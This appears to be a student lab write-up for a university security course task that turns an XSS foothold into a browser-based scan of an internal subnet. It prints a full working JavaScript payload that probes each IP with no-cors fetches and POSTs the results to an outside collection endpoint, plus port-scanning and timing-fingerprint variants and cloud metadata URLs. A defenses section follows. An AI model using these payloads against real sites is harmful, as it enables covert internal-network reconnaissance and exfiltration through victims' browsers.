---
title: Task 5.2 - Local Network Scanning via XSS
date: 2025-10-19 00:00:00 +0000
categories: [Gatech, Courses]
hidden: true
published: false
tags: [xss, network-scanning, internal-network, fetch-api, no-cors]
toc: true
---

## Background

This task demonstrated how an XSS vulnerability can be leveraged to turn a victim's browser into a scanner for the internal network. Unlike traditional network scanners that run on the attacker's machine, this attack uses the victim's browser to probe the internal network, discovering services that aren't accessible from the public internet.

### The Scenario

Many organizations have internal web services that are only accessible from within the corporate network:

- Admin panels
- Development servers
- Internal APIs
- Monitoring dashboards
- Database management interfaces

These services are often less secure than public-facing applications because they're assumed to be protected by the network perimeter. An XSS attack can bypass this perimeter by executing code in an authenticated user's browser.

## The Challenge

The goal was to scan the internal network range `172.16.238.0/24` and identify which IP addresses were running web servers. The constraints were:

1. **Same-Origin Policy** - The browser restricts cross-origin requests
2. **CORS** - Most internal services don't have CORS headers configured
3. **No direct response access** - We can't read the response from cross-origin requests
4. **Limited time** - The scan must complete before the user closes the page

## Approach

### Understanding the Same-Origin Policy

The Same-Origin Policy (SOP) prevents JavaScript from reading responses from different origins:

```javascript
// This request is sent, but we can't read the response
fetch("http://internal-server.local/admin").then((res) => res.text()); // Error: CORS policy blocks this
```

However, the browser still **sends** the request and receives the response—we just can't access it from JavaScript.

### The no-cors Mode

The Fetch API has a `mode: 'no-cors'` option that allows cross-origin requests without CORS headers:

```javascript
fetch("http://internal-server.local/admin", {
  mode: "no-cors",
}).then((res) => {
  // We can't read res.text() or res.json()
  // But we know the request succeeded!
});
```

**Key insight:** We can detect if a request **succeeded** (server responded) vs. **failed** (no server at that IP), even if we can't read the response.

## Implementation

### Step 1: Generate IP Range

First, generate an array of all IPs to scan in the `172.16.238.0/24` range:

```javascript
var ipsToScan = [];
for (var i = 4; i <= 255; i++) {
  ipsToScan.push("172.16.238." + i);
}
```

**Note:** Started at `.4` instead of `.1` because:

- `.1` is typically the router/gateway
- `.2` and `.3` might be reserved
- The task specified starting from `.4`

### Step 2: Create Scan Function

Create a function that attempts to fetch a URL and returns the IP if successful:

```javascript
function scanIP(ip) {
  return fetch("http://" + ip, {
    method: "GET",
    mode: "no-cors",
  })
    .then(function (response) {
      // Request succeeded - server exists at this IP
      return ip;
    })
    .catch(function (error) {
      // Request failed - no server at this IP
      return null;
    });
}
```

**How it works:**

- If a web server exists at the IP, the fetch succeeds and returns the IP
- If no server exists, the fetch fails (connection refused/timeout) and returns `null`

### Step 3: Scan All IPs in Parallel

Use `Promise.all()` to scan all IPs simultaneously:

```javascript
var scanPromises = ipsToScan.map(function (ip) {
  return scanIP(ip);
});

Promise.all(scanPromises).then(function (results) {
  // Filter out null results (failed scans)
  var validIPs = results.filter(function (ip) {
    return ip !== null;
  });

  // validIPs now contains all IPs with web servers
});
```

**Why parallel scanning:**

- Scanning 252 IPs sequentially would take too long
- Parallel scanning completes in seconds
- The browser can handle many concurrent requests

### Step 4: Exfiltrate Results

Send the discovered IPs to the attacker's endpoint:

```javascript
var resultString = validIPs.join(",");
fetch("https://cs6262.gtisc.gatech.edu/receive/gguruvelli3/2065", {
  method: "POST",
  body: "scan_results=" + encodeURIComponent(resultString),
});
```

### Complete Payload

```javascript
window.gotYou = true;

function scanIP(ip) {
  return fetch("http://" + ip, {
    method: "GET",
    mode: "no-cors",
  })
    .then(function (response) {
      return ip;
    })
    .catch(function (error) {
      return null;
    });
}

// Generate array of IPs to scan (172.16.238.4 to 172.16.238.255)
var ipsToScan = [];
for (var i = 4; i <= 255; i++) {
  ipsToScan.push("172.16.238." + i);
}

// Create promises for all IP scans
var scanPromises = ipsToScan.map(function (ip) {
  return scanIP(ip);
});

// Wait for all scans to complete
Promise.all(scanPromises)
  .then(function (results) {
    // Filter out null results (failed requests)
    var validIPs = results.filter(function (ip) {
      return ip !== null;
    });

    // Send results to endpoint
    var resultString = validIPs.join(",");
    fetch("https://cs6262.gtisc.gatech.edu/receive/gguruvelli3/2065", {
      method: "POST",
      body: "scan_results=" + encodeURIComponent(resultString),
    });

    // Also send individual IPs for debugging
    validIPs.forEach(function (ip) {
      fetch("https://cs6262.gtisc.gatech.edu/receive/gguruvelli3/2065", {
        method: "POST",
        body: "found_ip=" + ip,
      });
    });
  })
  .catch(function (error) {
    // Send error to endpoint
    fetch("https://cs6262.gtisc.gatech.edu/receive/gguruvelli3/2065", {
      method: "POST",
      body: "scan_error=" + encodeURIComponent(error.toString()),
    });
  });
```

## Results

**Discovered IPs:** `172.16.238.58, 172.16.238.97, 172.16.238.128, 172.16.238.138, 172.16.238.243`

The scan successfully identified 5 active web servers on the internal network.

## Why It Works

### The Attack Flow

```
┌─────────────────────────────────────────────────────────────┐
│ 1. Victim visits page with XSS payload                     │
│    - Payload executes in victim's browser                  │
│    - Browser is inside the corporate network               │
└────────────────────┬────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────┐
│ 2. JavaScript generates list of IPs to scan                │
│    - 172.16.238.4 through 172.16.238.255                   │
│    - Total: 252 IP addresses                               │
└────────────────────┬────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────┐
│ 3. For each IP, attempt HTTP request                       │
│    - fetch("http://172.16.238.X", {mode: "no-cors"})       │
│    - Browser sends request from victim's network           │
└────────────────────┬────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────┐
│ 4. Server exists → Request succeeds                        │
│    No server → Request fails (connection refused)          │
└────────────────────┬────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────┐
│ 5. Collect all successful IPs                              │
│    - 172.16.238.58, 172.16.238.97, ...                     │
└────────────────────┬────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────┐
│ 6. Exfiltrate results to attacker's endpoint               │
│    - POST to https://cs6262.gtisc.gatech.edu/receive/...   │
└─────────────────────────────────────────────────────────────┘
```

### Why no-cors Works

The `mode: 'no-cors'` option tells the browser:

- "I don't need to read the response"
- "Just send the request and tell me if it succeeded"

This bypasses CORS restrictions because we're not trying to access the response data.

### Browser Behavior

When `fetch` with `mode: 'no-cors'` is used:

**Server exists:**

```
fetch("http://172.16.238.58")
→ Browser sends: GET / HTTP/1.1
→ Server responds: HTTP/1.1 200 OK
→ Promise resolves (success)
```

**No server:**

```
fetch("http://172.16.238.99")
→ Browser sends: GET / HTTP/1.1
→ Connection refused (no server listening)
→ Promise rejects (failure)
```

We can't read the response, but we can detect the difference between success and failure.

## Advanced Techniques

### Port Scanning

The same technique can scan different ports:

```javascript
function scanPort(ip, port) {
  return fetch("http://" + ip + ":" + port, {
    mode: "no-cors",
  })
    .then(() => ({ ip, port, open: true }))
    .catch(() => ({ ip, port, open: false }));
}

// Scan common ports
var ports = [80, 443, 8080, 8443, 3000, 5000, 8000];
var promises = [];

ipsToScan.forEach((ip) => {
  ports.forEach((port) => {
    promises.push(scanPort(ip, port));
  });
});

Promise.all(promises).then((results) => {
  var openPorts = results.filter((r) => r.open);
  // Exfiltrate openPorts
});
```

### Service Fingerprinting

Some services can be fingerprinted by timing:

```javascript
function fingerprintService(ip) {
  var start = Date.now();
  return fetch("http://" + ip, { mode: "no-cors" }).then(() => {
    var duration = Date.now() - start;
    return { ip, responseTime: duration };
  });
}
```

Different services have different response times, which can help identify them.

### Timing-Based Detection

Even without reading the response, timing can reveal information:

```javascript
function detectService(ip) {
  var timings = [];

  // Try multiple requests
  return Promise.all([
    timeRequest(ip + "/"),
    timeRequest(ip + "/admin"),
    timeRequest(ip + "/api"),
    timeRequest(ip + "/login"),
  ]).then((results) => {
    // Analyze timing patterns to guess service type
    return guessService(results);
  });
}
```

## Defense Mechanisms

### 1. Network Segmentation

Isolate sensitive services on separate network segments:

```
┌─────────────────┐
│ Public Network  │
│  (DMZ)          │
└────────┬────────┘
         │
    ┌────┴────┐
    │ Firewall│
    └────┬────┘
         │
┌────────┴────────┐
│ Internal Network│
│  (Trusted)      │
└────────┬────────┘
         │
    ┌────┴────┐
    │ Firewall│
    └────┬────┘
         │
┌────────┴────────┐
│ Sensitive Svcs  │
│  (Restricted)   │
└─────────────────┘
```

Even if an attacker compromises the internal network, they can't reach sensitive services.

### 2. Content Security Policy

CSP can restrict which domains JavaScript can connect to:

```http
Content-Security-Policy: connect-src 'self' https://trusted-api.com
```

This blocks `fetch` requests to internal IPs.

### 3. Private Network Access (Upcoming Standard)

Chrome is implementing a new standard that requires CORS preflight for private network requests:

```http
Access-Control-Allow-Private-Network: true
```

This will make internal network scanning harder in the future.

### 4. Rate Limiting

Limit the number of requests a user can make:

```javascript
// Server-side rate limiting
const rateLimit = require("express-rate-limit");

const limiter = rateLimit({
  windowMs: 1 * 60 * 1000, // 1 minute
  max: 100, // Limit each IP to 100 requests per minute
});

app.use(limiter);
```

This slows down network scans.

### 5. Monitoring and Alerting

Detect unusual network activity:

```javascript
// Monitor for rapid requests to multiple IPs
if (requestsToUniqueIPs > 50 in 60 seconds) {
    alert("Possible network scan detected");
}
```

### 6. Disable Unnecessary Services

Only run services that are needed:

```bash
# Check what's listening
netstat -tuln

# Disable unnecessary services
systemctl stop unnecessary-service
systemctl disable unnecessary-service
```

### 7. Require Authentication

Even for internal services, require authentication:

```javascript
app.use((req, res, next) => {
  if (!req.session.authenticated) {
    return res.status(401).send("Unauthorized");
  }
  next();
});
```

This limits what an attacker can discover even if they scan the network.

## Real-World Impact

### Case Study: Internal Admin Panels

Many organizations have admin panels accessible only from the internal network:

```
http://admin.internal.company.com
http://192.168.1.100/admin
http://10.0.0.50:8080/dashboard
```

An XSS attack can:

1. Scan the internal network to find these panels
2. Access them using the victim's authenticated session
3. Exfiltrate sensitive data or modify configurations

### Case Study: Cloud Metadata Services

Cloud providers expose metadata services on private IPs:

```
AWS:   http://169.254.169.254/latest/meta-data/
Azure: http://169.254.169.254/metadata/instance
GCP:   http://metadata.google.internal/computeMetadata/v1/
```

An XSS attack in a cloud-hosted application can access these endpoints to steal:

- IAM credentials
- API keys
- Instance configuration
- Network information

### Case Study: Docker Containers

Docker containers can access the host's network:

```
http://172.17.0.1:2375  # Docker daemon API
http://172.17.0.1:8080  # Other container services
```

An XSS attack in a containerized application can scan for and access other containers.

## Key Lessons

1. **XSS bypasses network perimeter** - Internal services are accessible from the victim's browser

2. **no-cors mode enables scanning** - We can detect service existence without reading responses

3. **Parallel scanning is fast** - Hundreds of IPs can be scanned in seconds

4. **Internal services are often less secure** - They assume network-level protection

5. **Defense requires multiple layers** - Network segmentation, CSP, authentication, monitoring

6. **Cloud metadata is a high-value target** - XSS in cloud environments can lead to credential theft

7. **Timing can reveal information** - Even without reading responses, timing analysis is possible

## Conclusion

This task demonstrated that an XSS vulnerability is not just a client-side issue—it can be used to attack the internal network. By leveraging the victim's browser as a proxy, an attacker can discover and potentially exploit internal services that are assumed to be protected by the network perimeter. The defense requires a combination of preventing XSS, implementing Content Security Policy, segmenting the network, and requiring authentication for all services, even internal ones. The assumption that "internal = secure" is dangerous in the age of XSS and other client-side attacks.
